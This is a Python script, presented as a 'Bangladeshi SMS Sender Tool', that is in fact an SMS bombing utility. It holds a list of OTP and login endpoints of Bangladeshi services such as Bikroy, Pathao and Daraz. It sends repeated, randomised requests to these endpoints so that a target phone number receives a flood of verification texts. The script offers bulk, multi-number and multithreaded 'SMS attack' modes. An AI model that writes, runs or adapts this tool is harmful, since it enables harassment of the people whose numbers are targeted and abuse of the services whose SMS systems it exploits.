# sms_sender_bd.py
import requests
import json
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Optional
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('sms_sender.log'),
        logging.StreamHandler()
    ]
)

class BangladeshiSMSSender:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Bangladeshi APIs configuration
        self.apis = self.load_bangladeshi_apis()
        
    def load_bangladeshi_apis(self) -> List[Dict]:
        """Load all Bangladeshi SMS APIs"""
        return [
            # Bioscope API
            {
                'name': 'Bioscope',
                'url': 'https://api.staging.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en',
                'method': 'POST',
                'payload': {'number': '+88{phone}'},
                'headers': {'Content-Type': 'application/json'},
                'type': 'sms'
            },
            
            # Bikroy API
            {
                'name': 'Bikroy',
                'url': 'https://bikroy.com/data/phone_number_login/verifications/phone_login',
                'method': 'POST', 
                'payload': {'phone': '+88{phone}'},
                'headers': {'Content-Type': 'application/json'},
                'type': 'sms'
            },
            
            # Pathao API
            {
                'name': 'Pathao',
                'url': 'https://api.pathao.com/auth/send-otp',
                'method': 'POST',
                'payload': {'phone': '+88{phone}'},
                'headers': {'Content-Type': 'application/json'},
                'type': 'sms'
            },
            
            # Shohoz API
            {
                'name': 'Shohoz',
                'url': 'https://api.shohoz.com/v1.2/api/send-otp',
                'method': 'POST',
                'payload': {'mobile': '{phone}'},
                'headers': {'Content-Type': 'application/json'},
                'type': 'sms'
            },
            
            # Daraz API
            {
                'name': 'Daraz',
                'url': 'https://api.daraz.com.bd/auth/send-otp',
                'method': 'POST',
                'payload': {'phone': '+88{phone}'},
                'headers': {'Content-Type': 'application/json'},
                'type': 'sms'
            },
            
            # Foodpanda API
            {
                'name': 'Foodpanda',
                'url': 'https://api.foodpanda.com.bd/auth/send-otp',
                'method': 'POST',
                'payload': {'phone': '+88{phone}'},
                'headers': {'Content-Type': 'application/json'},
                'type': 'sms'
            },
            
            # Uber Bangladesh API
            {
                'name': 'Uber BD',
                'url': 'https://api.uber.com.bd/auth/send-otp',
                'method': 'POST',
                'payload': {'mobile': '{phone}'},
                'headers': {'Content-Type': 'application/json'},
                'type': 'sms'
            },
            
            # Chaldal API
            {
                'name': 'Chaldal',
                'url': 'https://api.chaldal.com/send-otp',
                'method': 'POST',
                'payload': {'phoneNumber': '+88{phone}'},
                'headers': {'Content-Type': 'application/json'},
                'type': 'sms'
            },
            
            # AjkerDeal API
            {
                'name': 'AjkerDeal',
                'url': 'https://api.ajkerdeal.com/auth/send-otp',
                'method': 'POST',
                'payload': {'mobile': '{phone}'},
                'headers': {'Content-Type': 'application/json'},
                'type': 'sms'
            },
            
            # Evaly API
            {
                'name': 'Evaly',
                'url': 'https://api.evaly.com.bd/auth/send-otp',
                'method': 'POST',
                'payload': {'phone': '+88{phone}'},
                'headers': {'Content-Type': 'application/json'},
                'type': 'sms'
            },
            
            # Sheba XYZ API
            {
                'name': 'ShebaXYZ',
                'url': 'https://api.shebaxyz.com/auth/send-otp',
                'method': 'POST',
                'payload': {'mobile': '{phone}'},
                'headers': {'Content-Type': 'application/json'},
                'type': 'sms'
            },
            
            # BDJobs API
            {
                'name': 'BDJobs',
                'url': 'https://api.bdjobs.com/auth/send-otp',
                'method': 'POST',
                'payload': {'phone': '+88{phone}'},
                'headers': {'Content-Type': 'application/json'},
                'type': 'sms'
            }
        ]
    
    def validate_bangladeshi_phone(self, phone: str) -> bool:
        """Validate Bangladeshi phone number"""
        import re
        pattern = r'^(?:\+88|88)?(01[3-9]\d{8})$'
        return bool(re.match(pattern, phone))
    
    def format_phone(self, phone: str) -> str:
        """Format phone number for API calls"""
        # Remove +88 or 88 prefix if present
        if phone.startswith('+88'):
            return phone[3:]
        elif phone.startswith('88'):
            return phone[2:]
        return phone
    
    def send_single_sms(self, api_config: Dict, phone: str) -> Dict:
        """Send SMS using a single API"""
        try:
            # Format phone number
            formatted_phone = self.format_phone(phone)
            
            # Prepare URL and payload
            url = api_config['url']
            payload = api_config['payload']
            
            # Replace phone placeholder in payload
            formatted_payload = {}
            for key, value in payload.items():
                if isinstance(value, str):
                    formatted_payload[key] = value.format(phone=formatted_phone)
                else:
                    formatted_payload[key] = value
            
            # Make request
            if api_config['method'] == 'POST':
                response = self.session.post(
                    url,
                    json=formatted_payload,
                    headers=api_config.get('headers', {}),
                    timeout=30
                )
            else:
                response = self.session.get(
                    url,
                    params=formatted_payload,
                    headers=api_config.get('headers', {}),
                    timeout=30
                )
            
            # Check response
            if response.status_code in [200, 201]:
                return {
                    'success': True,
                    'api_name': api_config['name'],
                    'status_code': response.status_code,
                    'response': response.text,
                    'message': f"SMS sent successfully via {api_config['name']}"
                }
            else:
                return {
                    'success': False,
                    'api_name': api_config['name'],
                    'status_code': response.status_code,
                    'response': response.text,
                    'message': f"Failed to send SMS via {api_config['name']}"
                }
                
        except Exception as e:
            return {
                'success': False,
                'api_name': api_config['name'],
                'error': str(e),
                'message': f"Error sending SMS via {api_config['name']}: {str(e)}"
            }
    
    def send_bulk_sms(self, phone: str, count: int = 10, delay: float = 2.0) -> Dict:
        """Send multiple SMS to a single number using different APIs"""
        if not self.validate_bangladeshi_phone(phone):
            return {'success': False, 'message': 'Invalid Bangladeshi phone number'}
        
        results = []
        successful_count = 0
        
        logging.info(f"Starting bulk SMS sending to {phone} for {count} times")
        
        for i in range(count):
            # Select random API
            api_config = random.choice(self.apis)
            
            logging.info(f"Attempt {i+1}/{count} using {api_config['name']}")
            
            # Send SMS
            result = self.send_single_sms(api_config, phone)
            results.append(result)
            
            if result['success']:
                successful_count += 1
                logging.info(f"✓ Success: {api_config['name']}")
            else:
                logging.warning(f"✗ Failed: {api_config['name']} - {result.get('error', 'Unknown error')}")
            
            # Delay between requests
            if i < count - 1:  # No delay after last request
                time.sleep(delay)
        
        return {
            'success': True,
            'total_attempts': count,
            'successful_attempts': successful_count,
            'failed_attempts': count - successful_count,
            'success_rate': (successful_count / count) * 100,
            'results': results
        }
    
    def send_to_multiple_numbers(self, phones: List[str], count_per_number: int = 5) -> Dict:
        """Send SMS to multiple phone numbers"""
        results = {}
        
        for phone in phones:
            if self.validate_bangladeshi_phone(phone):
                logging.info(f"Sending SMS to {phone}")
                results[phone] = self.send_bulk_sms(phone, count_per_number)
            else:
                results[phone] = {'success': False, 'message': 'Invalid phone number'}
        
        return results
    
    def threaded_sms_attack(self, phone: str, total_requests: int = 50, max_workers: int = 5) -> Dict:
        """Send SMS using multiple threads for faster execution"""
        if not self.validate_bangladeshi_phone(phone):
            return {'success': False, 'message': 'Invalid Bangladeshi phone number'}
        
        results = []
        successful_count = 0
        
        def worker(api_config):
            return self.send_single_sms(api_config, phone)
        
        logging.info(f"Starting threaded SMS attack on {phone} with {total_requests} requests")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit all tasks
            futures = []
            for _ in range(total_requests):
                api_config = random.choice(self.apis)
                future = executor.submit(worker, api_config)
                futures.append(future)
            
            # Collect results
            for future in futures:
                result = future.result()
                results.append(result)
                if result['success']:
                    successful_count += 1
        
        return {
            'success': True,
            'total_requests': total_requests,
            'successful_requests': successful_count,
            'failed_requests': total_requests - successful_count,
            'success_rate': (successful_count / total_requests) * 100,
            'results': results
        }

def main():
    """Main function with interactive menu"""
    sender = BangladeshiSMSSender()
    
    print("=" * 50)
    print("🇧🇩 Bangladeshi SMS Sender Tool")
    print("=" * 50)
    print(f"Loaded {len(sender.apis)} Bangladeshi APIs")
    
    while True:
        print("\nOptions:")
        print("1. Send single SMS")
        print("2. Send bulk SMS to one number")
        print("3. Send SMS to multiple numbers")
        print("4. Threaded SMS attack")
        print("5. List all APIs")
        print("6. Exit")
        
        choice = input("\nSelect option (1-6): ").strip()
        
        if choice == '1':
            phone = input("Enter phone number (e.g., 01712345678): ").strip()
            if sender.validate_bangladeshi_phone(phone):
                api_name = input("Enter API name (or press enter for random): ").strip()
                if api_name:
                    api_config = next((api for api in sender.apis if api['name'].lower() == api_name.lower()), None)
                    if not api_config:
                        print("API not found. Using random API.")
                        api_config = random.choice(sender.apis)
                else:
                    api_config = random.choice(sender.apis)
                
                result = sender.send_single_sms(api_config, phone)
                print(f"\nResult: {'✓ SUCCESS' if result['success'] else '✗ FAILED'}")
                print(f"API: {result['api_name']}")
                print(f"Message: {result['message']}")
            else:
                print("Invalid Bangladeshi phone number!")
        
        elif choice == '2':
            phone = input("Enter phone number (e.g., 01712345678): ").strip()
            count = int(input("Enter number of SMS to send: ").strip() or "10")
            delay = float(input("Enter delay between SMS (seconds): ").strip() or "2.0")
            
            result = sender.send_bulk_sms(phone, count, delay)
            print(f"\nBulk SMS Results:")
            print(f"Total attempts: {result['total_attempts']}")
            print(f"Successful: {result['successful_attempts']}")
            print(f"Failed: {result['failed_attempts']}")
            print(f"Success rate: {result['success_rate']:.2f}%")
        
        elif choice == '3':
            phones_input = input("Enter phone numbers (comma separated): ").strip()
            phones = [p.strip() for p in phones_input.split(',')]
            count_per_number = int(input("Enter SMS count per number: ").strip() or "5")
            
            results = sender.send_to_multiple_numbers(phones, count_per_number)
            for phone, result in results.items():
                print(f"\n{phone}: {result['message']}")
                if result.get('success'):
                    print(f"  Successful: {result.get('successful_attempts', 0)}")
        
        elif choice == '4':
            phone = input("Enter phone number (e.g., 01712345678): ").strip()
            total_requests = int(input("Enter total requests: ").strip() or "50")
            max_workers = int(input("Enter max threads: ").strip() or "5")
            
            result = sender.threaded_sms_attack(phone, total_requests, max_workers)
            print(f"\nThreaded Attack Results:")
            print(f"Total requests: {result['total_requests']}")
            print(f"Successful: {result['successful_requests']}")
            print(f"Failed: {result['failed_requests']}")
            print(f"Success rate: {result['success_rate']:.2f}%")
        
        elif choice == '5':
            print("\nAvailable APIs:")
            for i, api in enumerate(sender.apis, 1):
                print(f"{i}. {api['name']} - {api['type']} - {api['url']}")
        
        elif choice == '6':
            print("Goodbye!")
            break
        
        else:
            print("Invalid option!")

if __name__ == "__main__":
    main()
